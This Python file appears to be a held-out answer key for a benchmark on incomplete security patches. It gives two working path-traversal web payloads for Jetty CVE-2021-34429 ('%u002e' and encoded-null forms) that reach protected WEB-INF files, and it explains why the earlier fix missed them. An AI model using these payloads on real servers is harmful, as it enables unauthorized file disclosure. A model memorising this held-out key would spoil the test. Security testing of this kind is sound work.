#!/usr/bin/env python3
"""[HELD-OUT] CVE-2021-34429 residual exploit — %u002e (Jetty %u-encoding).

The CVE-2021-28164 fix (V1 = 9.4.39) only taught the guard to reject the plain
`%2e` dot-segment reaching WEB-INF. It kept Jetty's non-standard UTF-16 style
`%uXXXX` decoding in the default compliance mode: `%u002e` still decodes to `.`,
recreating the exact authorization-before-canonicalization bypass. So
`/%u002e/WEB-INF/pcb-secret.txt` slips past the V1 guard and the DefaultServlet
serves the protected file. This residual is exactly what CVE-2021-34429 reports
("This is a variation of the vulnerability reported in CVE-2021-28164").

Contract: reaches the canary (flag) on V1 (jetty 9.4.39) => the case is a
legitimate incomplete-patch positive. Closed on V2 (jetty 9.4.43), which
restores decode-before-normalize ordering and rejects ambiguous URIs (400).

An equivalent residual is the encoded-null form `/.%00/WEB-INF/pcb-secret.txt`.

NEVER exposed to the system-under-test (held out under _heldout/).
"""
from __future__ import annotations

# Jetty %u-encoded dot: `%u002e` -> `.` in the default compliance decoder.
PATH = "/%u002e/WEB-INF/pcb-secret.txt"

# Alternate residual (encoded null defeats normalization): kept for reference.
PATH_NULL = "/.%00/WEB-INF/pcb-secret.txt"


def candidate() -> dict:
    return {"probe_id": "cve-2021-34429-percent-u-dot", "method": "GET", "path": PATH}


def candidate_null() -> dict:
    return {"probe_id": "cve-2021-34429-encoded-null", "method": "GET", "path": PATH_NULL}


if __name__ == "__main__":
    print(candidate()["path"])
